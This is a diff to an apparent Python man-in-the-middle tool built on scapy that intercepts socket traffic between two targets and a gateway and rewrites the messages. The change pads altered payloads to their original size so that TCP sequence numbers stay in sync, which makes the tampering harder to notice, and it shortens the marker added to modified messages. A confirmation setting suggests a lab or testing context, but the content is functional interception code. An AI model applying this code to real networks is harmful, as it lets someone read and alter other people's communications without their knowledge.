@@ -190,6 +190,7 @@ def modify_bidirectional_packet(packet):
         
         if message.strip():
             logger.warning(f"[SOCKET-MESSAGE] 📨 {direction} | Intercepted: '{message.strip()}'")
+            logger.info(f"[SOCKET-DEBUG] Original packet size: {len(payload)} bytes")
             
             if ENABLE_BIDIRECTIONAL_INTERCEPTION:
                 # Modify the message using configured modifications
@@ -199,8 +200,12 @@ def modify_bidirectional_packet(packet):
                     logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Original: '{message.strip()}'")
                     logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Modified: '{modified_message.strip()}'")
                     
+                    # CRITICAL: Maintain packet size to preserve TCP sequence numbers
+                    modified_payload = pad_to_original_size(modified_message.encode('utf-8'), len(payload))
+                    logger.info(f"[SOCKET-DEBUG] Modified packet size: {len(modified_payload)} bytes (padded to match original)")
+                    
                     # Update packet with modified payload
-                    scapy_pkt[Raw].load = modified_message.encode('utf-8')
+                    scapy_pkt[Raw].load = modified_payload
                     
                     # Recalculate checksums
                     del scapy_pkt[IP].len
@@ -209,12 +214,27 @@ def modify_bidirectional_packet(packet):
                     
                     packet.set_payload(bytes(scapy_pkt))
                     logger.info(f"[SOCKET-MODIFY] ✅ {direction} | Message successfully modified!")
+                else:
+                    logger.info(f"[SOCKET-MODIFY] ⏸️ {direction} | No modifications applied")
             
     except UnicodeDecodeError:
         # Handle binary data
         logger.info(f"[SOCKET-BINARY] 📦 {direction} | Binary data: {len(payload)} bytes")
         
     packet.accept()
+
+def pad_to_original_size(modified_payload, original_size):
+    """Pad the modified payload to match the original packet size"""
+    if len(modified_payload) == original_size:
+        return modified_payload
+    elif len(modified_payload) < original_size:
+        # Pad with spaces to maintain the same size
+        padding_needed = original_size - len(modified_payload)
+        return modified_payload + b' ' * padding_needed
+    else:
+        # If somehow larger, truncate (shouldn't happen with our modifications)
+        logger.warning(f"[SOCKET-DEBUG] Modified payload larger than original, truncating")
+        return modified_payload[:original_size]
 
 def modify_socket_message(original_message, direction):
     """Modify socket messages using configured replacements"""
@@ -235,7 +255,9 @@ def modify_socket_message(original_message, direction):
     
     # Add interception marker if message was modified
     if message != original_message:
-        message = f"[MITM:{direction.split()[0]}→{direction.split()[-1]}] {message}"
+        # Use shorter marker to avoid making message too long
+        direction_short = f"{direction.split()[0][:1]}→{direction.split()[-1][:1]}"
+        message = f"[M:{direction_short}] {message}"
     
     return message
 
@@ -265,6 +287,7 @@ def start_bidirectional_interception():
     logger.info(f"[MITM] 🌐 Gateway: {gateway_device}")
     logger.info(f"[MITM] 🔧 Bidirectional: {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
     logger.info(f"[MITM] 🔀 Modifications: {SOCKET_MODIFICATIONS}")
+    logger.info("[MITM] 💡 TCP sequence numbers preserved by padding packets to original size")
     logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
     
     try:
@@ -293,6 +316,11 @@ def display_configuration():
     print(f"  • {target_1.name} ↔ {target_2.name} (Direct)")
     print(f"  • {target_1.name} → Gateway → {target_2.name} (Routed)")
     print(f"  • {target_2.name} → Gateway → {target_1.name} (Routed)")
+    print("=" * 70)
+    print("🔧 TCP Sequence Number Preservation:")
+    print("  • Packets padded to maintain original size")
+    print("  • Prevents TCP desynchronization")
+    print("  • Ensures reliable bidirectional interception")
     print("=" * 70)
     
     if SecurityConfig.REQUIRE_CONFIRMATION:
